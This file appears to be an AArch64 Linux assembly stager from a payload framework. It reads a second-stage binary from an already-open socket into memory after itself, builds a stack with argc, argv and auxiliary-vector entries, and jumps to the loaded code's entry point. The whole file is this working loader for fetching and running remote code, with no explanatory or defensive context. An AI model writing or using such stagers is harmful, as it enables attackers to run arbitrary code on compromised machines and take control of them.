.equ SYS_READ, 0x3f
.equ SYS_EXIT, 0x5d

start:
    adr    x2, size
    ldr    w2, [x2]
    mov    x10, x2

    adr    x0, next_stage
    lsr    x0, x0, #12
    add    x0, x0, #1
    lsl    x0, x0, #12

    /* Grab the saved size, save the address */
    mov    x4, x10

    /* Save the memory address */
    mov    x3, x0
    mov    x10, x0

read_loop:
    /* read(sockfd, buf='x3', nbytes='x4') */
    mov    x0, x12
    mov    x1, x3
    mov    x2, x4
    mov    x8, SYS_READ
    svc    0
    cbz    w0, failed
    add    x3, x3, x0
    subs   x4, x4, x0
    bne    read_loop

    /* add entry_offset */
    adr    x0, entry
    ldr    x0, [x0]
    add    x0, x0, x10
    mov    x14, x0

    /* set up the initial stack */
    mov    x0, sp
    and    sp, x0, #-16
    add    sp, sp, #(16 * 6)

    /* argc = 2, argv[0] = 'm' */
    mov    x0, #2
    mov    x1, #109
    str    x1, [sp]
    mov    x1, sp

    mov    x2, x12
    mov    x3, 0

    mov    x4, 0
    mov    x5, #7 /* AT_BASE */

    mov    x6, x10
    mov    x7, #6 /* AT_PAGESZ */

    mov    x8, #0x1000
    mov    x9, #25 /* AT_RANDOM */

    mov    x10, x10
    mov    x11, #0 /* AT_NULL */

    stp    x10, x11, [sp, #-16]!
    stp    x8, x9, [sp, #-16]!
    stp    x6, x7, [sp, #-16]!
    stp    x4, x5, [sp, #-16]!
    stp    x2, x3, [sp, #-16]!
    stp    x0, x1, [sp, #-16]!

    mov    x29, #0
    mov    x30, #0
    br     x14

failed:
    mov    x0, 0
    mov    x8, SYS_EXIT
    svc    0

.balign 16
size:
        .word 0
        .word 0
entry:
        .word 0
        .word 0

next_stage:
